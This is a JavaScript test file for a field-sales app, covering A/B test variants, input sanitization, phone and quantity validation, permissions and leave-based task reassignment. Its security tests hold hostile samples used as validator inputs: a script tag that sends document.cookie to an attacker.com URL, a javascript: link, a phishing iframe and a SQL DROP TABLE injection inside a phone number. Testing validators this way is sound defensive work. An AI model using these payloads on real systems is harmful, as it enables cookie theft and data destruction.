import test from 'node:test';
import assert from 'node:assert/strict';

// Import A/B Testing Engine
import {
  getExperimentVariant,
  ACTIVE_EXPERIMENTS,
  getExperimentAnalytics,
} from '../src/lib/ab-testing.ts';

// Import Security & Validation Functions
import {
  sanitizeText,
  validateSafeInput,
  validateNepaliPhone,
  validateQuantity,
} from '../src/lib/validation.ts';

// Import Database & Permission Services
import { db } from '../src/lib/db/db-service.ts';
import { canAccessBrand, canPerform, hasAccess, isSuperAdmin } from '../src/lib/permissions.ts';

// ==========================================
// 1. A/B Testing Engine Verification
// ==========================================
test('A/B Testing - returns deterministic variant for identical user/device ID', () => {
  const userIdA = 'user_officer_101';
  const variant1 = getExperimentVariant('premium-nav-style', userIdA);
  const variant2 = getExperimentVariant('premium-nav-style', userIdA);

  assert.equal(variant1, variant2, 'Same user ID must always receive identical variant');
  assert.ok(
    ['control', 'glass_premium'].includes(variant1),
    `Variant ${variant1} must be an active variant`
  );
});

test('A/B Testing - returns valid variant for different experiments', () => {
  const userIdB = 'user_officer_202';
  const navVariant = getExperimentVariant('premium-nav-style', userIdB);
  const kpiVariant = getExperimentVariant('dashboard-kpi-layout', userIdB);

  assert.ok(['control', 'glass_premium'].includes(navVariant));
  assert.ok(['control', 'compact_pro'].includes(kpiVariant));
});

test('A/B Testing - analytics structure returns valid rates and numbers', () => {
  const analytics = getExperimentAnalytics('premium-nav-style');
  assert.equal(analytics.experimentId, 'premium-nav-style');
  assert.ok(Array.isArray(analytics.variants));
  assert.ok(analytics.variants.length >= 2);
  analytics.variants.forEach((v) => {
    assert.ok(typeof v.conversionRate === 'number');
    assert.ok(v.conversionRate >= 0 && v.conversionRate <= 100);
  });
});

// ==========================================
// 2. Security Testing: Input Sanitization & XSS
// ==========================================
test('Security - sanitizeText eliminates malicious <script> tags and handlers', () => {
  const dirtyPayload = 'Hello <script>alert("XSS")</script> world!';
  const sanitized = sanitizeText(dirtyPayload);
  assert.equal(sanitized, 'Hello  world!');
  assert.ok(!sanitized.includes('<script>'));
});

test('Security - sanitizeText neutralizes javascript: pseudo-protocol', () => {
  const linkPayload = 'Click here: javascript:alert(document.cookie)';
  const sanitized = sanitizeText(linkPayload);
  assert.ok(!sanitized.includes('javascript:'));
});

test('Security - validateSafeInput detects disallowed malicious payloads', () => {
  const malicious1 = '<script>fetch("https://attacker.com/steal?c=" + document.cookie)</script>';
  const malicious2 = '<iframe src="https://phishing.site"></iframe>';
  const safeText = 'Store visit note: New shipment arrived safely at Sundhara branch.';

  assert.ok(validateSafeInput(malicious1, 'Notes') !== null, 'Must flag <script>');
  assert.ok(validateSafeInput(malicious2, 'Notes') !== null, 'Must flag <iframe>');
  assert.equal(validateSafeInput(safeText, 'Notes'), null, 'Must pass clean input');
});

test('Security - phone validation blocks malformed and injection numbers', () => {
  assert.equal(validateNepaliPhone('9841234567'), null, 'Valid 10-digit 98 prefix');
  assert.equal(validateNepaliPhone('+977-9851099999'), null, 'Valid +977 prefix');
  assert.ok(validateNepaliPhone('9841234567; DROP TABLE users;') !== null, 'Must block SQL/script string');
  assert.ok(validateNepaliPhone('1234567890') !== null, 'Must block non-Nepali prefix');
  assert.ok(validateNepaliPhone('984123') !== null, 'Must block truncated phone numbers');
});

test('Security - quantity validation enforces positive integers only', () => {
  assert.equal(validateQuantity(10), null);
  assert.ok(validateQuantity(-5) !== null, 'Must reject negative numbers');
  assert.ok(validateQuantity(0) !== null, 'Must reject zero');
  assert.ok(validateQuantity(3.14) !== null, 'Must reject fractional floats');
  assert.ok(validateQuantity('abc') !== null, 'Must reject non-numeric string');
});

test('Permission visibility hides ungranted features and empty brand assignments', () => {
  const officer = {
    id: 'officer-1',
    role: 'SALES_OFFICER',
    assignedBrands: [],
    customPermissions: {
      gps_tracking: { access: 'HIDDEN', scope: null, actions: [] },
    },
  };

  assert.equal(hasAccess(officer, 'gps_tracking'), false);
  assert.equal(canAccessBrand(officer, 'FORYA'), false);
  assert.equal(canAccessBrand({ role: 'SALES_OFFICER' }, 'FORYA'), true);
});

// ==========================================
// 3. UI Flow & Assignment Logic
// ==========================================
test('UI Flow - Beat Route Assignment & Staff Leave Relief Workflow', () => {
  // Test User
  const users = db.getUsers();
  assert.ok(users.length > 0, 'Must have at least super admin user');

  const admin = users[0];
  assert.ok(isSuperAdmin(admin));

  // Add a temporary sales officer for relief testing
  const reliefOfficer = db.createUser({
    fullName: 'Test Relief Officer',
    email: 'test-relief-officer@example.invalid',
    phone: '9801234567',
    role: 'SALES_OFFICER',
    territory: 'Lalitpur Beat',
  });

  const absentOfficer = db.createUser({
    fullName: 'Test Absent Officer',
    email: 'test-absent-officer@example.invalid',
    phone: '9807654321',
    role: 'SALES_OFFICER',
    territory: 'Kathmandu Beat',
  });

  // Assign beat route to absent officer
  const store = db.getStoresUnified()[0];
  if (store) {
    db.createAndAssignBeatRoute({
      officerId: absentOfficer.id,
      dateAd: new Date().toISOString().split('T')[0],
      storeIds: [store.id],
      priority: 'HIGH',
      managerNotes: 'Pitch new serum line',
    });
  }

  // Assign a pending task to absent officer
  const task = db.createTask({
    title: 'Urgent Store Visit to City Mart',
    assignedTo: absentOfficer.id,
    assignedToName: absentOfficer.fullName,
    createdBy: admin.id,
    priority: 'HIGH',
    dueDateBs: '2083-07-09',
    dueDateAd: new Date().toISOString().split('T')[0],
    status: 'OPEN',
    autoCreated: false,
  });

  // Execute Staff Leave & Relief Reassignment
  const result = db.reassignOfficerBeatsAndTasks({
    fromOfficerId: absentOfficer.id,
    toOfficerId: reliefOfficer.id,
    leaveStartDateAd: '2026-10-25',
    leaveEndDateAd: '2026-10-28',
    reason: 'Medical Leave',
  });

  // Verify:
  assert.ok(result.reassignedTasksCount >= 1, 'Task must be reassigned');
  const updatedTask = db.getTasks().find((t) => t.id === task.id);
  assert.equal(updatedTask?.assignedTo, reliefOfficer.id);
  assert.ok(updatedTask?.description?.includes('Covering for Test Absent Officer'));

  const updatedAbsentOfficer = db.getUsers().find((u) => u.id === absentOfficer.id);
  assert.equal(updatedAbsentOfficer?.dutyStatus, 'ON_LEAVE');

  // Clean up test users
  db.deleteUser(reliefOfficer.id);
  db.deleteUser(absentOfficer.id);
  db.deleteTask(task.id);
});
